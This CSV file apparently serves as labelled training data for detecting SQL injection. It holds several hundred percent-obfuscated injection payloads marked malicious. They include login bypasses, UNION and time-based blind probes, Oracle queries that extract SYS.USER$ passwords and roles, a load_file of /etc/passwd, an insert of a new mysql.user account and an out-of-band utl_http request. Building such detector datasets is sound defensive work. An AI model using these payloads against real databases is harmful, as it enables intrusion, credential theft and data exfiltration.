Query,Label
" %%a%%n%d 1  =  utl_%%i%%naddr.get_host_address   (    (   se%%l%%e%c%t D%isT%%i%%nCT  (  PASSWorD  )   fro%%m   (  se%%l%%e%c%t D%isT%%i%%nCT  (  PASSWorD  )  , ROWNUM AS %l%im%it fro%%m SYS.USER$  )   %wh%e%r%%e %l%im%it  =  8   )    )    %%a%%n%d 'i'  =  'i",1
" %%s%el%%ec%%t * %%fr%%o%m users %whe%%re id  =  1 o%r ""?#"" o%r 1  =  1 -- 1",1
"%o%%r 1  =  1 %o%%r """"  =  ",1
/**/o%%r/**/1/**/  =  /**/1,1
" s%%e%l%%e%c%t * %f%%r%om users %w%h%e%%r%%e id  =  1 %%o%r "".  (  "" %%o%r 1  =  1 -- 1",1
" %s%%e%%l%ec%%t * %%f%%ro%%m users w%he%%re id  =  '1' %u%nio%n %s%%e%%l%ec%%t ||/1,version  (    )   -- 1'",1
" %%s%%el%e%ct * f%r%om users w%%h%%ere id  =  '1' uni%on %%s%%el%e%ct +\.,@@VERSION -- 1'",1
%o%r 1  =  1/*,1
%27 %%o%%r 1  =  1,1
" selec%t * f%ro%m users %whe%%r%%e id  =  1 <@&@ %%u%%n%i%o%%n selec%t 1,version  (    )   -- 1",1
" s%e%l%%e%%c%t * %f%r%o%%m users %%wh%e%r%e id  =  '1' %u%%n%%i%%o%%n s%e%l%%e%%c%t $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" %se%%l%e%c%%t * %%f%%r%%o%m users %wh%%er%%e id  =  '1' o%%r $ 1  =  1 %%un%%i%%on %se%%l%e%c%%t 1,@@VERSION -- 1'",1
se%%le%%ct * %f%%r%%o%%m users %w%h%%e%%re id  =  1 o%%r \.<1 o%%r 1  =  1 -- 1,1
" %%se%%le%c%t * %f%r%o%m users wh%e%r%%e id  =  '1' o%%r \<\ %%u%%ni%o%%n %%se%%le%c%t 1,@@VERSION -- 1'",1
" s%%el%%ec%%t * %%f%ro%m users %wh%%e%r%%e id  =  1 %u%n%io%%n s%%el%%ec%%t 1||1,version  (    )   -- 1",1
" se%lec%t * f%%r%om users %w%%h%e%re id  =  1 ||1 u%%n%%i%%o%n se%lec%t %%nul%%l,banner f%%r%om v$version %w%%h%e%re rownum  =  1 -- 1",1
%%s%%e%lec%%t * %from users %wh%e%%re id  =  '1' %%o%r \.<\ %%o%r 1  =  1 -- 1',1
" se%%lect * %%f%%r%om users %%where id  =  1 %o%%r ""]{"" %o%%r 1  =  1 -- 1",1
" s%e%%le%ct * %f%%r%o%m users %w%%h%e%r%%e id  =  1 o%%r "".@"" o%%r 1  =  1 -- 1",1
" %%s%%e%l%%e%%c%t * %f%r%o%m users w%%he%r%%e id  =  1 or ""$["" or 1  =  1 -- 1",1
%%o%r 1 --',1
" %%s%%e%le%%c%t * %f%%rom users %%wh%ere id  =  1 %%o%r "",;"" %%o%r 1  =  1 -- 1",1
"adm%i%n"" or 1  =  1#",1
" s%e%%le%c%%t * %fr%%om users w%%h%%e%r%e id  =  1 +  (  1  )   %u%n%%i%%o%%n s%e%%le%c%%t nu%l%l,banner %fr%%om v$version w%%h%%e%r%e rownum  =  1 -- 1",1
\x27un%i%o%n s%%e%l%%ect,1
PRi%nT,1
" %%s%%el%%e%%ct * %%f%r%%o%m users %%wh%ere id  =  '1' u%%n%ion %%s%%el%%e%%ct   (  \.  )  ,@@VERSION -- 1'",1
%o%r 1  =  1--,1
1 %%or pg_sleep  (  __TIME__  )  --,1
" %s%e%l%ec%t * %%f%r%%o%m users %%w%%h%er%e id  =  1 o%r "",#"" o%r 1  =  1 -- 1",1
adm%%i%n'  )   %%o%%r   (  '1'  =  '1'/*,1
%o%%r 2 %%be%%tw%%e%%e%n 1 a%nd 3,1
" %se%%le%c%t * f%r%%o%%m users %%w%%h%e%%re id  =  1 %or ""  )  .""  =  1 %or 1  =  1 -- 1",1
" %s%ele%%ct * %%f%%ro%m users %%w%h%%er%e id  =  1 %%o%r 1#"". un%i%%on %s%ele%%ct n%u%l%l,version  (    )   -- 1",1
adm%%i%%n' o%r '1'  =  '1,1
; if %n%%ot  (  %s%e%%l%%e%ct system_user  )   <> 'sa' waitfo%r delay '0:0:2' --,1
" %s%%e%%l%e%ct * %f%%r%%om users w%here id  =  1 %%u%%n%%i%%o%%n %s%%e%%l%e%ct 1,banner %f%%r%%om v$version w%here rownum  =  1 -- 1",1
""" o%%r 0  =  0 --",1
" %%s%%ele%ct * %f%ro%m users %wh%e%r%e id  =  1 u%ni%on %%s%%ele%ct @ $_,version  (    )   -- 1",1
s%e%l%e%%c%%t * %f%%r%o%%m users %wh%%e%%r%e id  =  1 <@.$ %%or 1  =  1 -- 1,1
" sel%%ect * %f%%r%%o%m users %wh%ere id  =  1 %%o%%r ""%."" %%o%%r 1  =  1 -- 1",1
" se%l%%ec%t * %%f%r%o%%m users w%%h%e%r%%e id  =  1 + $+*$ %%u%%n%%io%n se%l%%ec%t %%n%%u%l%l,@@VERSION -- 1",1
" sel%%e%%c%%t * %fro%%m users %wh%%e%r%%e id  =  1 o%r "",."" o%r 1  =  1 -- 1",1
char%4039%41%2b%40%s%e%lec%t,1
" s%e%%l%%e%%c%%t * %f%%ro%%m users %%w%h%e%%re id  =  1 %%o%%r ""1&"" %%o%%r 1  =  1 -- 1",1
admi%%n'  )   %o%r   (  '1'  =  '1,1
declare @s varchar   (  200  )   sele%c%%t @s   =   0x73656c6 ...,1
"or 0  =  0 #""",1
" %%s%%e%%l%e%ct * fro%%m users %%w%h%%e%%r%e id  =  1 %%o%r "".]"" %%o%r 1  =  1 -- 1",1
  )   %%or   (  'x'  =  'x,1
" %%se%l%e%%c%%t * from users wh%%e%%re id  =  1.<@$ %%un%%io%%n %%se%l%e%%c%%t 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" %%s%%e%%lec%%t * %%f%%r%o%m users wh%e%r%%e id  =  1 *1 u%n%%i%on %%s%%e%%lec%%t %n%u%ll,banner %%f%%r%o%m v$version wh%e%r%%e rownum  =  1 -- 1",1
"1 %%u%%ni%%o%%n all sel%e%c%%t 1,2,3,4,5,6,name %fr%om sysobjects %%whe%%r%%e xtype   =   'u' --",1
" %sel%%ec%%t * f%ro%m users wh%e%r%e id  =  1 or 1#"". %u%n%%i%%on %sel%%ec%%t 'a',version  (    )   -- 1",1
" %%s%%e%l%e%ct * %f%%r%%o%m users wh%%e%re id  =  1 %o%r 1#""; %u%%nio%n %%s%%e%l%e%ct %%n%%ul%l,version  (    )   -- 1",1
" s%e%l%%e%c%t * %f%ro%%m users %%wh%%e%%r%e id  =  1 %o%r 1#""? %o%r 1  =  1 -- 1",1
"""a"""" %%o%r 1  =  1--""",1
" s%el%%e%c%%t * %f%%r%%o%m users w%%he%r%%e id  =  1 *1 un%i%%o%n s%el%%e%c%%t 1,banner %f%%r%%o%m v$version w%%he%r%%e rownum  =  1 -- 1",1
" %%an%d 1  =  utl_i%%naddr.get_host_address   (    (   s%%e%%l%ect D%i%%sTi%%nCT  (  column_name  )   %%f%r%om   (  s%%e%%l%ect D%i%%sTi%%nCT  (  column_name  )  , ROWNUM AS %%limi%t %%f%r%om all_tab_columns  )   %w%%he%%re %%limi%t  =  4   )    )    %%an%d 'i'  =  'i",1
" %%s%e%l%%e%c%%t * %f%%r%%om users %w%h%e%%re id  =  '1' u%n%%io%n %%s%e%l%%e%c%%t   (  \  )  ,@@VERSION -- 1'",1
1 %an%d user_name  (    )     =   'dbo',1
"; if %not  (  substr%%i%%ng   (    (   %se%l%%e%%c%%t @@version  )  ,24,1  )   <> 1  )   waitfo%r delay '0:0:2' --",1
" %%s%%e%le%c%t * %f%ro%m users %wh%e%r%e id  =  1 %o%%r 1#""$ un%%i%o%n %%s%%e%le%c%t 1,version  (    )   -- 1",1
" %s%e%lec%t * %%f%ro%%m users wh%e%r%%e id  =  1 %%or 1#""{ %%u%%n%i%o%%n %s%e%lec%t %n%u%%ll,version  (    )   -- 1",1
%s%el%e%c%t * %%f%ro%%m users w%%h%ere id  =  '1' *$ . o%r 1  =  1 -- 1',1
s%el%e%ct * %%f%%r%om users w%%h%%er%e id  =  1 +$+. %%or 1  =  1 -- 1,1
%se%%l%ec%t * %%f%r%%o%%m users %w%h%%e%%r%e id  =  1 %%or   (  \+  )    =  1 %%or 1  =  1 -- 1,1
" %an%d 1  =  utl_%inaddr.get_host_address   (    (   s%ele%c%t D%i%%sT%inCT  (  USERNAME  )   f%ro%m   (  s%ele%c%t D%i%%sT%inCT  (  USERNAME  )  , ROWNUM AS li%%mi%t f%ro%m SYS.ALL_USERS  )   w%h%%er%%e li%%mi%t  =  6   )    )    %an%d 'i'  =  'i",1
%%o%%r 1  =  1 %%o%%r ''  =  ',1
%%selec%%t * %f%%ro%%m users %%wh%e%%re id  =  1   o%r 1  =  1 -- 1,1
o%r 'text' > 't',1
"1234 "" %%an%d 1  =  0 uni%%o%n ALL s%%e%le%%c%t ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" s%e%%le%c%%t * %f%r%om users w%he%%r%e id  =  1 o%%r ""%["" o%%r 1  =  1 -- 1",1
" %%se%l%%e%c%%t * f%rom users w%h%er%%e id  =  1 o%%r 1#"";  =  1 u%n%io%n %%se%l%%e%c%%t 1,version  (    )   -- 1",1
adm%%i%n' %or '1'  =  '1'#,1
se%%le%ct * f%r%o%%m users %wh%er%%e id  =  1 +$ 1 %%o%%r 1  =  1 -- 1,1
s,1
" a%%n%%d 1  =  utl_%%inaddr.get_host_address   (    (   %%s%%e%%lec%t DisT%%inCT  (  USERNAME  )   fr%%o%m   (  %%s%%e%%lec%t DisT%%inCT  (  USERNAME  )  , ROWNUM AS %li%%m%%i%%t fr%%o%m SYS.ALL_USERS  )   %w%h%e%%r%e %li%%m%%i%%t  =  4   )    )    a%%n%%d 'i'  =  'i",1
 %s%%e%l%ec%%t * %%f%%r%o%m i%%nf%%o%%rmation_schema.t%%a%%bl%es--,1
" %s%%e%%l%%e%%c%t * %f%%r%%om users %%wh%e%%r%e id  =  1 %%o%r ""$&"" %%o%r 1  =  1 -- 1",1
1   )    )    o%%r pg_sleep  (  __TIME__  )  --,1
" s%e%l%e%%ct * from users w%h%%e%r%e id  =  '1' un%io%%n s%e%l%e%%ct !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   s%ele%c%%t @q   =   0x770061 ...,1
 %%or 1  =  1 %%or ''  =  ',1
%s%ele%ct * f%r%%o%m users %%wh%%er%e id  =  1 %!<1 %%o%r 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   s%%e%l%e%c%%t @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" sel%e%ct * %f%r%o%m users %%w%h%e%%re id  =  1 or ""]1"" or 1  =  1 -- 1",1
" %s%e%le%%c%t * %%f%r%om users w%%h%e%%r%%e id  =  1 %o%%r $+<1 %%u%%n%%io%%n %s%e%le%%c%t 1,@@VERSION -- 1",1
%o%r 'unusual'   =   'unusual',1
 %or 1 %in   (  s%%el%ect @@version  )  --,1
t%r%u%nc%%a%%t%%e,1
as,1
 o%%r 3  =  3 --,1
" %%se%l%%ec%%t * %f%%r%%om users %%whe%re id  =  1 ||1 %%un%%i%%o%%n %%se%l%%ec%%t 1,banner %f%%r%%om v$version %%whe%re rownum  =  1 -- 1",1
" %se%le%c%t * %fr%%o%m users %%w%%he%r%e id  =  1 <@$$ un%%i%on %se%le%c%t 1,version  (    )   -- 1",1
"admi%%n""  )   o%%r   (  ""1""  =  ""1",1
" s%e%l%ec%t * %f%%r%o%%m users whe%r%%e id  =  1 %or 1#""@ %%u%n%i%o%%n s%e%l%ec%t 'a',version  (    )   -- 1",1
"1  )   %%o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
" %s%e%%lect * f%r%o%m users %wh%e%%r%%e id  =  1 %%uni%%on %s%e%%lect .1_,version  (    )   -- 1",1
 %a%%n%d 1  =  utl_%%i%naddr.get_host_address   (    (   se%%lect SYS.d%at%%a%%b%%a%se_NAME %%f%r%o%%m DUAL   )    )    %a%%n%d 'i'  =  'i,1
" o%r 0  =  0 #""",1
%se%%l%%e%%ct * %%fr%%o%m users %w%here id  =  1 %$ 1 %%o%r 1  =  1 -- 1,1
%%s%e%l%e%c%t * %%f%ro%%m users wh%e%r%%e id  =  1 %!<@ %%o%r 1  =  1 -- 1,1
"; if n%%ot  (  substr%i%%ng   (    (   %s%%e%%l%e%%ct @@version  )  ,25,1  )   <> 0  )   waitfo%%r delay '0:0:2' --",1
1  )   %%o%r sleep  (  __TIME__  )  #,1
" s%%e%%lect * %f%%rom users wh%er%e id  =  1 o%r ""1_"" o%r 1  =  1 -- 1",1
" %s%%e%%le%c%t * f%ro%m users w%he%re id  =  1 <1## un%i%%on %s%%e%%le%c%t 1,version  (    )   -- 1",1
" %s%%elect * %%f%r%%o%m users %w%%h%e%%re id  =  1 + $+*\ %unio%%n %s%%elect %nul%l,@@VERSION -- 1",1
%s%%e%l%%e%ct * f%%ro%m users w%%he%%r%e id  =  1. <@ %%or 1  =  1 -- 1,1
 %%or true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' o%r 'x'  =  'x';,1
%s%elec%t * %%f%%r%o%m users w%he%r%%e id  =  1 <@ %%o%%r 1  =  1 -- 1,1
" %%s%e%le%%c%t * f%r%om users w%%he%r%e id  =  1 %o%%r "".,"" %o%%r 1  =  1 -- 1",1
adm%in' #,1
" %%s%e%%l%e%%c%t * %%f%ro%m users %w%%h%%e%%re id  =  1 <@$_ u%n%ion %%s%e%%l%e%%c%t 1,version  (    )   -- 1",1
" %%s%%e%le%%c%%t * %%f%%r%%om users %w%%her%e id  =  1 %%or "",  (  "" %%or 1  =  1 -- 1",1
" s%el%ect * fr%o%m users wher%e id  =  1 or "",{"" or 1  =  1 -- 1",1
" %un%i%%o%%n %s%%ele%%ct 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitf%%o%r delay '0:0:__TIME__'--",1
 %or 'unusual'   =   'unusual',1
"i%n%%s%%er%%t i%n%%to mysql.user   (  user, host, passw%%o%rd  )   %v%al%u%e%s   (  'name', 'localhost', passw%%o%rd  (  'pass123'   )    )   ",1
"admi%%n"" %o%r ""1""  =  ""1""/*",1
" s%e%%l%%e%%c%t * f%ro%%m users w%%he%r%%e id  =  1 %o%%r ""1  (  ""  =  1 %o%%r 1  =  1 -- 1",1
" %%s%%e%lec%t * %f%r%o%%m users %%w%h%e%re id  =  1 o%r \<1 %u%%n%i%%o%%n %%s%%e%lec%t 1,@@VERSION -- 1",1
%li%k%%e,1
%o%%r username %l%%ike char  (  37  )  ;,1
 )    )    %o%%r pg_sleep  (  __TIME__  )  --,1
%s%%el%ec%%t * %f%%r%om users w%he%%re id  =  1 o%%r $+<\ o%%r 1  =  1 -- 1,1
%or 3  =  3,1
" s%%el%%e%c%%t * f%%r%o%%m users w%her%%e id  =  1 o%r ""  (  ."" o%r 1  =  1 -- 1",1
se%l%e%c%%t * %f%%ro%m users %%w%h%%e%%re id  =  1 %%o%%r   (  $+  )    =  1 %%o%%r 1  =  1 -- 1,1
exec sp,1
" s%%el%ect * %f%%ro%%m users %%whe%r%e id  =  1 %o%r \+<$ un%%i%on s%%el%ect 1,@@VERSION -- 1",1
%s%e%%le%ct * %fro%m users %wh%e%r%%e id  =  1 %%o%%r \<$ %%o%%r 1  =  1 -- 1,1
" %se%l%%e%ct * %fr%%o%m users %%w%%he%%r%%e id  =  1.&&1 %uni%%o%%n %se%l%%e%ct 1,version  (    )   -- 1",1
adm%i%n' %o%r 1  =  1/*,1
a' waitf%o%%r delay '0:0:10'--,1
" %%sel%ec%t * %f%r%o%m users w%%h%er%e id  =  1 +  (  \  )   %%un%ion %%sel%ec%t %%n%%u%%l%%l,@@VERSION -- 1",1
" %s%%e%l%e%ct * %%fr%o%%m users w%%h%er%%e id  =  1 %%u%%ni%%o%%n %s%%e%l%e%ct .1$_,version  (    )   -- 1",1
%%a%n%d 1 in   (  %%se%l%e%%c%%t var fr%%o%m temp  )  --,1
hi'  )   %%or   (  'a'  =  'a,1
" %%a%%n%%d 1  =  utl_%inaddr.get_host_address   (    (   s%e%%l%ect D%i%sT%inCT  (  column_name  )   %%f%r%om   (  s%e%%l%ect D%i%sT%inCT  (  column_name  )  , ROWNUM AS %li%mi%t %%f%r%om all_tab_columns  )   %%wher%%e %li%mi%t  =  1   )    )    %%a%%n%%d 'i'  =  'i",1
"admin"" %o%r 1  =  1",1
"""  )   %or true--",1
" se%le%c%t * %%f%%r%%o%m users %%whe%%r%e id  =  '1' %o%%r $ .  =  1 u%%n%%i%%o%%n se%le%c%t 1,@@VERSION -- 1'",1
" s%e%%l%e%%c%%t * %%f%%ro%m users %%w%%he%r%e id  =  1 %%or ""  (  {"" %%or 1  =  1 -- 1",1
1  )   %o%%r pg_sleep  (  __TIME__  )  --,1
" %s%e%%le%%c%t * f%ro%m users %%wh%e%%r%%e id  =  1 %or ""{."" %or 1  =  1 -- 1",1
"""  )   o%%r sleep  (  __TIME__  )    =  """,1
%sel%%e%%c%%t * %%f%%r%o%m users whe%%r%%e id  =  1.<@. or 1  =  1 -- 1,1
"adm%i%%n""  )   %%o%r   (  ""1""  =  ""1""--",1
" sel%e%%c%%t * %f%%r%%o%m users %%where id  =  1<@.. %u%%ni%%o%%n sel%e%%c%%t 1,version  (    )   -- 1",1
; exec xp_regread,1
" se%lect * %%f%r%%om users w%%h%%e%r%e id  =  '1' + @ 1 %%un%%i%%o%n se%lect 1,version  (    )   -- 1'",1
%sel%%ec%%t * %%f%r%o%m users w%%h%%e%re id  =  1 + \+%1 %or 1  =  1 -- 1,1
" %%s%%e%%le%c%%t * f%%r%%om users w%%he%re id  =  1 %%or "";1"" %%or 1  =  1 -- 1",1
" %se%%l%e%%ct * %%f%%r%o%%m users w%%h%er%%e id  =  1 %or ""%&"" %or 1  =  1 -- 1",1
1 a%%n%%d 1  =  1,1
%or 0  =  0 #,1
u%n%%i%%o%n s%%e%le%c%%t * %f%r%om users %%w%h%er%%e log%in   =   char ...,1
" %s%%e%%le%c%%t * fr%%om users %w%he%%r%%e id  =  1 %%u%%n%%io%n %s%%e%%le%c%%t 1||@,version  (    )   -- 1",1
adm%i%%n'  )   o%r '1'  =  '1'--,1
1;s%%elec%t *,1
" %s%e%lec%%t * fr%om users %%w%%h%e%re id  =  1 %%o%%r ""{;"" %%o%%r 1  =  1 -- 1",1
x' %a%%n%%d 1  =    (  %s%%el%e%%c%%t count  (  *  )   %%f%%r%%om tabname  )  ; --,1
" %%se%l%ec%%t * %fr%om users %w%h%ere id  =  '1' %o%r """"<@ %un%%i%on %%se%l%ec%%t 1,version  (    )   -- 1'",1
" %s%%ele%%c%t * %%f%%r%%o%m users w%%h%ere id  =  1 %%o%%r ""?,"" %%o%%r 1  =  1 -- 1",1
" %%se%l%e%%c%%t * %%fr%%om users %w%%he%r%e id  =  '1' ||1 %%u%%ni%on %%se%l%e%%c%%t 1,banner %%fr%%om v$version %w%%he%r%e rownum  =  1 -- 1'",1
"1 %%o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
or ''  =  ',1
 %%a%nd 1  =  utl_inaddr.get_host_address   (    (   %sele%%ct SYS.LOGin_USER %f%ro%m DUAL   )    )    %%a%nd 'i'  =  'i,1
" %an%%d 1  =  utl_i%%naddr.get_host_address   (    (   %%s%e%le%ct D%%i%sTi%%nCT  (  USERNAME  )   %%f%r%o%%m   (  %%s%e%le%ct D%%i%sTi%%nCT  (  USERNAME  )  , ROWNUM AS %l%%i%%mi%t %%f%r%o%%m SYS.ALL_USERS  )   %%w%h%e%re %l%%i%%mi%t  =  2   )    )    %an%%d 'i'  =  'i",1
\'; %%d%%es%c users; --,1
" %%sele%%c%%t * %f%%ro%m users %w%%h%e%%r%e id  =  1 o%%r   (  \.  )    =  1 u%%n%ion %%sele%%c%%t 1,@@VERSION -- 1",1
%se%%l%e%%c%t * %%fr%%o%%m users %%w%h%e%%r%e id  =  '1' %%o%%r $ 1  =  1 %%o%%r 1  =  1 -- 1',1
""" o%r """"^""",1
"""-""",1
" %%s%elect * fr%o%%m users %w%h%%er%e id  =  1 o%%r \<   =  1 u%ni%on %%s%elect 1,@@VERSION -- 1",1
" %se%l%%e%%c%t * %%f%rom users w%h%e%%r%e id  =  1 %%uni%on %se%l%%e%%c%t 1<@$,version  (    )   -- 1",1
" %%s%ele%c%%t * %f%%r%om users %%wh%%e%r%%e id  =  1 *\ u%%n%i%%on %%s%ele%c%%t %%nu%ll,@@VERSION -- 1",1
" %se%%l%e%%c%t * %%f%r%o%m users %w%her%e id  =  '1' %%or !<@ un%io%%n %se%%l%e%%c%t 1,version  (    )   -- 1'",1
" %sel%%e%c%t * f%r%%om users %%w%%he%r%e id  =  1 or "".%"" or 1  =  1 -- 1",1
adm%i%%n'/*,1
" %se%%l%e%%ct * %f%%r%%om users w%h%%e%r%%e id  =  1 %or ""  (  #"" %or 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" %and 1  =  utl_%inaddr.get_host_address   (    (   select Di%sT%inCT  (  t%%abl%%e_name  )   f%%ro%%m   (  select Di%sT%inCT  (  t%%abl%%e_name  )  , ROWNUM AS l%i%m%%it f%%ro%%m sys.all_t%%abl%%es  )   w%%h%e%re l%i%m%%it  =  1   )    )    %and 'i'  =  'i",1
" %%se%%le%ct * fr%%o%%m users wh%e%%re id  =  '1'<@.. un%i%%o%n %%se%%le%ct 1,version  (    )   -- 1'",1
"""   )    )    %o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
" se%%lect * %%fr%o%%m users %%w%her%%e id  =  1 <@.$ %%un%%i%on se%%lect 1,version  (    )   -- 1",1
" s%%e%l%e%c%t * f%%r%%o%m users %w%h%e%%r%e id  =  1 %%o%%r $ .  =  1 %%u%n%%i%o%%n s%%e%l%e%c%t 1,@@VERSION -- 1",1
se%%l%%e%ct * fr%%o%%m users %w%%h%e%%r%%e id  =  '1' <@.$ %%o%r 1  =  1 -- 1',1
1 uni/**/on %%s%e%%l%%e%c%t all f%%r%%o%%m %w%h%e%%re,1
" %selec%%t * f%%r%%o%%m users %%wh%e%%r%e id  =  1 +$ . %u%n%io%%n %selec%%t n%ull,@@VERSION -- 1",1
" s%e%%l%%e%%c%%t * f%r%om users wh%er%%e id  =  1 %o%%r 1#""? un%i%on s%e%%l%%e%%c%%t %%nu%l%%l,version  (    )   -- 1",1
adm%in'  )   %o%%r '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
%%or '7659'  =  '7659,1
" s%%e%%l%%ec%%t * %f%%r%%o%m users w%%h%%er%e id  =  1 o%%r ""{@"" o%%r 1  =  1 -- 1",1
" s%e%%l%e%%ct * f%%r%%o%m users %%w%%he%r%e id  =  1 %%%u%n%%i%o%%n s%e%%l%e%%ct +!<1,version  (    )   -- 1",1
" a%n%%d 1  =  utl_%%inaddr.get_host_address   (    (   s%elec%t DisT%%inCT  (  granted_role  )   %%f%%ro%%m   (  s%elec%t DisT%%inCT  (  granted_role  )  , ROWNUM AS %l%i%%mi%%t %%f%%ro%%m dba_role_privs %wh%%e%%r%%e GRANTEE  =  SYS.LOG%%inUSER  )   %wh%%e%%r%%e %l%i%%mi%%t  =  6   )    )    a%n%%d 'i'  =  'i",1
" %se%%lec%%t * %%fr%o%%m users %%w%%he%%r%%e id  =  1 %or ""  (  @"" %or 1  =  1 -- 1",1
%or true--,1
" %s%e%%l%e%%ct * %%f%%ro%m users w%%he%%re id  =  1 %%u%%n%i%%o%n %s%e%%l%e%%ct !<1,version  (    )   -- 1",1
" %sel%e%ct * %%f%%r%o%%m users w%her%%e id  =  '1' un%i%%o%n %sel%e%ct \#,@@VERSION -- 1'",1
" s%%e%l%%e%ct * %%f%%ro%%m users %wh%e%%re id  =  1 %or 1#""{ %u%%n%%i%%on s%%e%l%%e%ct 1,version  (    )   -- 1",1
""" o%%r true--",1
